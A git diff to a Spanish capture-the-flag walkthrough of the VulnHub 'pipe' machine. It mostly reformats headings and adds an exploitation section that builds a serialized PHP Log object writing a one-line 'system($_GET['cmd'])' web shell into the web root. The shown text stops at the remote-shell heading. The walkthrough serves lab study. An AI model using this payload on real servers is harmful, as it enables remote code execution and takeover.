@@ -7,11 +7,11 @@
 
 - URL: https://www.vulnhub.com/entry/devrandom-pipe,124/
 
-# Fases
+## Fases
 
-## Fase 1: Identificación y enumeración
+### Fase 1: Identificación y enumeración
 
-### Identificación de la dirección IP
+#### Identificación de la dirección IP
 
 - Arp-scan
 
@@ -21,7 +21,7 @@
 
 La máquina tiene la dirección IP: 172.16.113.51
 
-### Enumeración de servicios
+#### Enumeración de servicios
 
 - Enumeración de puertos e identificación de servicios
 
@@ -36,7 +36,7 @@ La máquina tiene la dirección IP: 172.16.113.51
 
   Normalmente, las web presentan más vectores de entrada.
 
-### Análisis de la web
+#### Análisis de la web
 
 - Al acceder a la aplicación web se detecta que esta protegida por una auth basic:
 
@@ -49,7 +49,7 @@ La máquina tiene la dirección IP: 172.16.113.51
 
   Se prueban varios juegos de credenciales típicos (root/root, admin/admin, etc) sin éxito.
 
-#### Bypass Authorization basic
+##### Bypass Authorization basic
 
 - Recursos:
 
@@ -65,9 +65,9 @@ La máquina tiene la dirección IP: 172.16.113.51
 - En el error 401 se indicaba que el realm era "index.php". Se realiza una prueba teniendo en cuenta el bypass de auth:
  ![200_0k](https://github.com/Nyanyi/Awae-exercises/blob/master/pipe/imagenes/200_0k.png)
 
-## Fase 2: Análisis de Vulnerabilidades
+### Fase 2: Análisis de Vulnerabilidades
 
-### Análisis de la web
+#### Análisis de la web
 
 - En la página únicamente hay una funcionalidad.
 
@@ -89,15 +89,13 @@ La máquina tiene la dirección IP: 172.16.113.51
 
   ![scriptz_direct](https://github.com/Nyanyi/Awae-exercises/blob/master/pipe/imagenes/scriptz_direct.png)
  
-### Análisis de los ficheros
+#### Análisis de los ficheros
 
 - Fichero log.php.bak
 
   `mv log.php.bak log.php`
 
   `cat log.php`
-
-  
 
   ```php
   <?php
@@ -128,7 +126,6 @@ La máquina tiene la dirección IP: 172.16.113.51
   }
   ?>
   ```
-
   A grandes rasgos, la funcionalidad de este script es crear un fichero y grabar en él determinados datos.
 
 - Fichero php.js
@@ -143,7 +140,7 @@ En base a los comentarios se comprueba que básicamente este script se utiliza p
   - Una función que serializa un objeto php.
   - La idea es que se podría crear un objeto LOG, con datos controlados por el usuario, serializarlo y enviarlo al servidor que hará el unmarshalling y ejecutará el código.
 
-- Fichero resultante:
+- Fichero resultante:payload.php
 
 ```php
 <?php
@@ -307,3 +304,27 @@ echo serialize($obj)."\n";
 
 ?>
 ```
+### Fase 3: Explotación de vulnerabilidades
+#### Creación del objeto serializado
+
+En el fichero "payload.php" se modifican las siguientes lineas:
+```php
+<?php
+
+$obj = new Log();
+$obj->filename = "/var/www/html/scriptz/shell_c.php";
+$obj->data = '<?php system($_GET[\'cmd\']); ?>';
+
+echo serialize($obj)."\n";
+
+?>
+````
+Y se obtiene el objeto php serializado:
+`php payload.php`
+`O:3:"Log":2:{s:8:"filename";s:33:"/var/www/html/scriptz/shell_c.php";s:4:"data";s:30:"<?php system($_GET['cmd']); ?>";}`
+
+#### Shell remota en el sistema
+
+A continuación se realiza lo siguiente:
+
+
